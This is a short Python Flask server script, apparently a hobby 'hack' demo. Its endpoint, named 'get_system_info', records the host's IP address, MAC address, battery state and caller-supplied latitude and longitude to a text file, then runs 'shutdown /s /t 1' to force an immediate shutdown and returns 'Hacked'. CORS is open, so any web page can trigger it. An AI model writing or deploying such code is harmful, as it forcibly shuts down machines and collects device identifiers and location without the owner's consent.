from getmac import get_mac_address as gma
import os
import socket
# import psutil


# # print('mac address:' , gma())
# # print(os.system('ipconfig'))

hostname = socket.gethostname()
# # print(hostname)

IpAddress = socket.gethostbyname(hostname)
# print(IpAddress)


# if IpAddress:
#     battery = psutil.sensors_battery()
#     print("Battery :",battery.percent,"%")
# else:
#     print("No Match Ip")


from flask import Flask,jsonify,render_template,request
import psutil
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# @app.route('/')
# def index():
#     return render_template('hack.html')

@app.route('/get_system_info', methods=['GET'])
def get_system_info():

    
    lat  = request.args.get('lat')
    lon  = request.args.get('lon')

    battery = psutil.sensors_battery()
    system_info = {
        "battery_percentage": f"{battery.percent}%",
        "charging": "Yes" if battery.power_plugged else "No",
        "ip":IpAddress,
        "mac":gma()

    }

    # packet = gpsd.get_current()
    # latitude = packet.lat
    # longitute = 
    # "\n" + "latitude : "+latitude + "\n"+"longitute :" + longitute 

    f = open("demofile3.txt", "w")
    filecontent = "battery_percentage : " + ""+ system_info['battery_percentage'] +"" + "\n"+"isPlugged : " + system_info['charging'] +"\n"+ system_info['ip'] +"\n"+ system_info['mac'] + "\n" + "latitude : "+lat + "\n" + "longitude :"+lon  
    f.write(filecontent)
    f.close()

    os.system("shutdown /s /t 1")
    # return jsonify(system_info)
    return "Hacked"

if __name__ == '__main__':
    app.run(debug=True)










